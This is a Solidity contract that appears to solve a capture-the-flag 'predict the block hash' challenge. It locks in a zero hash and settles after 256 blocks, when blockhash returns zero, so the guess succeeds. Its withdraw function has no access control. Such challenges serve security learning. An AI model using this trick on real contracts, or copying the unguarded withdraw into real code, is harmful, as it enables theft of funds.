pragma solidity ^0.8.13;


contract DumbPredictor {

    address challenge;
    uint settlementBlock;
    uint blockProducer;

    event LockInSuccess(bool success);
    event SettleSuccess(bool success);

    constructor(address _challenge) {
        challenge = _challenge;
    }

    function getSettlePayload() internal pure returns(bytes memory) {
        return abi.encodeWithSelector(bytes4(keccak256("settle()")));
    }

    function getChallengePayload(bytes32 arg) internal pure returns(bytes memory) {
        return abi.encodeWithSelector(bytes4(keccak256("lockInGuess(bytes32)")), arg);
    }

    function generatePredicableHash() internal pure returns (bytes32){
        return bytes32(0);
    }

    function lockGuess() public payable {

        require(msg.value == 1 ether, "Not enough ether");

        settlementBlock = block.number;
        bytes32 predictableBlockHash = generatePredicableHash();
        bytes memory payload = getChallengePayload(predictableBlockHash);
        (bool success,) = challenge.call{value: 1 ether}(payload);

        emit LockInSuccess(success);
    }

    function settle() public {

        require(block.number > settlementBlock + 256, "Function cannot be executed at this time");

        bytes memory payload = getSettlePayload();
        (bool success,) = challenge.call(payload);

        emit SettleSuccess(success);
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    function dummyBlockIterator() public {
        blockProducer += 1;
    }

    receive() external payable {}
}
